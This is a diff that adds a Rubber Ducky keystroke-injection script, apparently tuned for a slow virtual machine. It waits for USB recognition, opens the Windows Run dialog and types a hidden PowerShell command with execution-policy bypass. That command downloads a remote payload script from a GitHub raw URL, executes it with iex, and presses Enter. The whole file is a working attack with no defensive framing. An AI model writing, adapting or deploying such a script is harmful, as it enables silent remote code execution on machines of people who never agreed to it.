@@ -1,0 +1,25 @@
+REM ==========================================
+REM Rubber Ducky - For VERY SLOW VM
+REM Execution: ~20 seconds
+REM ==========================================
+
+REM Wait longer for USB recognition
+DELAY 7000
+
+REM Open Run dialog
+GUI r
+
+REM Wait even longer for Run dialog
+DELAY 3000
+
+REM Type PowerShell command slowly
+STRING cmd /c start /b powershell -w hidden -ep bypass -nop -c "iex(iwr -useb 'https://raw.githubusercontent.com/Zoex2304/dcpyld/main/payload.ps1')"
+
+REM Wait for typing completion
+DELAY 1000
+
+REM Execute
+ENTER
+
+REM Extra delay before unplugging
+DELAY 2000
